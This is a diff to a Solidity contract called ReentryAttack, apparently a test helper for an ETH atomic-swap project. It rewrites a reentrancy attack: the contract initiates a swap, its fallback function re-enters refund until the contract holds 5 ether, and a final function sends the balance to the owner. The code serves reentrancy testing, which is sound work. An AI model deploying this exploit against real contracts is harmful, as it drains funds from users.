@@ -1,32 +1,38 @@
 // SPDX-License-Identifier: BlueOak-1.0.0
 pragma solidity >=0.7.0 <0.9.0;
+
+import "./ETHSwapV0.sol" as ethswap;
+
 contract ReentryAttack {
 
-    address somebody;
-    address ethswap;
+    address public owner;
     bytes32 secretHash;
+    ethswap.ETHSwap swapper;
 
-    constructor() {}
+    constructor() {
+        owner = msg.sender;
+    }
 
-    function setUsUpTheBomb(address es, bytes32 sh)
+    function setUsUpTheBomb(address es, bytes32 sh, uint refundTimestamp, address participant)
         public
+        payable
     {
-        somebody = msg.sender;
-        ethswap = es;
+        swapper = ethswap.ETHSwap(es);
         secretHash = sh;
+        swapper.initiate{value: msg.value}(refundTimestamp, secretHash, participant);
     }
 
     function allYourBase()
         public
     {
-        ethswap.call{gas: 1000000000000000}(abi.encodeWithSignature("refund(bytes32)", secretHash));
+        swapper.refund(secretHash);
     }
 
     fallback ()
         external
         payable
     {
-        if (somebody.balance < 4 ether) {
+        if (address(this).balance < 5 ether) {
             allYourBase();
         }
     }
@@ -34,6 +40,6 @@ contract ReentryAttack {
     function areBelongToUs()
         public
     {
-        payable(somebody).transfer(address(this).balance);
+        payable(owner).transfer(address(this).balance);
     }
 }
